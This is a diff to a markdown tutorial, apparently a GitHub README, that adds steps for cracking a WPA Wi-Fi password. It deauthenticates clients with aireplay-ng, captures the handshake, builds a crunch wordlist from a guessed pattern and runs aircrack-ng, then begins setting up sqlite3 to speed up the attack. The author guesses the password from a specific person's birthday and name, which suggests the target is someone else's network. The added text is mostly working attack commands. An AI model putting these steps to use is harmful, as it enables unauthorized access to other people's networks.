@@ -34,7 +34,38 @@ new terminal
 aireplay-ng --deauth 0 -a <bssid> <iface>
 ```
 
+wait about 5s, return airodump-ng terminal, if you see WPA handshake is okay and Ctrl+C to stop (both)
 
+![image](https://user-images.githubusercontent.com/90561566/166421288-8ba74de3-f6f9-4973-be3e-d9aafd8fcb11.png)
+
+```
+ls
+```
+
+![image](https://user-images.githubusercontent.com/90561566/166421374-cfcf7080-c28a-402b-a6cb-9fda3a275a91.png)
+
+create passlist
+
+```
+crunch <min> <max> <charset> -t <pattern> -o password.txt
+```
+
+i know the password is 8 numbers (i think it contains in his birthday) and 1 character (i think it contains in his name)
+
+![image](https://user-images.githubusercontent.com/90561566/166421946-28b579db-7fb3-4cee-b1a4-797bd3a7212a.png)
+
+now you can crack wpa with
+
+```
+aircrack-ng -w password.txt out*.cap 
+```
+
+![image](https://user-images.githubusercontent.com/90561566/166422150-4ae8f0bd-47a0-4d57-9ddf-5f7905228535.png)
+
+
+but i will use database to speed up the attack
+
+install sqlite3 `sudo apt install sqlite3`
 
 
 
